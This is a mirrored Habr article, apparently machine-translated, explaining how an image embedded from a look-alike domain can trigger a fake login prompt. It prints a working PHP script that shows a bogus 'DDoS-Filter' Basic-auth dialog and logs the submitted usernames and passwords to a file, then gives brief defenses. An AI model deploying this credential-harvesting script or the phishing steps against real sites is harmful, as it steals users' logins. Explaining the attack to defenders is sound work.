<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Evil Phishing Pictures</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="That's right, people say: ‚ÄúEverything new is well forgotten old‚Äù 
 The possibility of embedding remote resources (for example, images from other sites...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Evil Phishing Pictures</h1><div class="post__text post__text-html js-mediator-article"><h5>  That's right, people say: ‚ÄúEverything new is well forgotten old‚Äù </h5><br>  The possibility of embedding remote resources (for example, images from other sites) on the page of your site is a very bad practice.  Which may at some point lead to quite serious consequences for the site.  10 years ago, I was surprised to read that this was possible.  And now, 10 years have passed, nothing has changed, and it seems that it is unlikely that it will ever change. <br><br>  Details under the cut <a name="habracut"></a><br><br><h4>  Theory and practice </h4><br>  1. A <s>hacker is</s> an evil user registers a domain similar to the spelling of the attacked domain. <br>  2. Uploads to it a script with such content in PHP 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'PHP_AUTH_USER'</span></span>])) { $vulnsite = parse_url($_SERVER[<span class="hljs-string"><span class="hljs-string">'REFERER'</span></span>]); <span class="hljs-comment"><span class="hljs-comment">//header('Content-Type: text/html; charset=windows-1251'); //header('WWW-Authenticate: Basic realm="'.ucfirst($vulnsite['host']).' DDoS-Filter: Enter your Login and Password"'); //header('HTTP/1.0 401 Unauthorized'); } else { $f = fopen('passes.txt', 'a'); fwrite($f, $_SERVER['PHP_AUTH_USER'].';'.$_SERVER['PHP_AUTH_PW']."\r\n"); fclose($f); } header("Content-type: image/jpeg"); $image = imagecreatefromjpeg('image.jpg'); imagejpeg($image); imagedestroy($image); exit(); //       image.jpg //          superphoto.jpg . </span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">?&gt;</span></span></span></span></code> </pre> <br><br>  3. Writes an article and embeds a picture in a post: <br><br> <code>&lt;img src="http://exEmple.com/evilimage.php" alt="image"/&gt;</code> <br> <br>  4. If there is a moderation on the site, then sends the article to moderation. <br>  5. For example, the article turned out to be good for him and it hits the main one. <br>  6. An evil person sees his brainchild on the main page and removes comments in PHP code, so in response to a request for a picture from the post, any user in the browser has a window with authorization, where anything can be written, for example, that the site is fighting off DDoS attack, and asks to re-enter the login and password. <br>  7. Not attentive user, does not read the domain name in the form of authorization and submit login and password. <br>  8. An evil person gets your username and password, his goal is reached. <br><br><h4>  Ways to protect </h4><br>  I think there can be two sane methods: <br><br><ul><li>  <b>At the browser level: a</b> ban on issuing an authorization window from another site </li><li>  <b>At the level of site developers:</b> Copying all remote resources to your hosting </li></ul><br><br>  <b>PS</b> <br><br>  Habrahabr.ru is not an exception here on the main one there are posts with pictures from other resources.  So you just need to keep this trick in your mind and always check to the letter the name of the domain that requires authorization. <br><br>  And there is always the potential danger that while the picture is on the main one, the site from which this picture stretches, can only be hacked in order to replace the picture with a script. <br><br>  <b>Pps</b> <br><br>  I do not think this is a bug. <br>  This is nothing more than a trick that is officially allowed by the HTTP protocol. </div><p>Source: <a href="https://habr.com/ru/post/140054/">https://habr.com/ru/post/140054/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../140049/index.html">Forced movement and / or installation of applications on a memory card without Root</a></li>
<li><a href="../140050/index.html">A few problems when creating your own programming language</a></li>
<li><a href="../140051/index.html">Asterisker's Notes - Exchange of Works and Services on VoIP - Telephony</a></li>
<li><a href="../140052/index.html">Transparent proxy server Squid with a password on Ubuntu 11.04</a></li>
<li><a href="../140053/index.html">Analyze this or what we do online</a></li>
<li><a href="../140055/index.html">Sysadmin and the path of the sword</a></li>
<li><a href="../140058/index.html">Writing compiler LALR (1) -parser. Basic theory</a></li>
<li><a href="../140060/index.html">25 useful shortcuts for Photoshop</a></li>
<li><a href="../140062/index.html">WebRTC in Mail.Ru Agent and ICQ - pros, cons and prospects</a></li>
<li><a href="../140064/index.html">Sony rolled out Ice Cream Sandwich release for Xperia smartphones</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>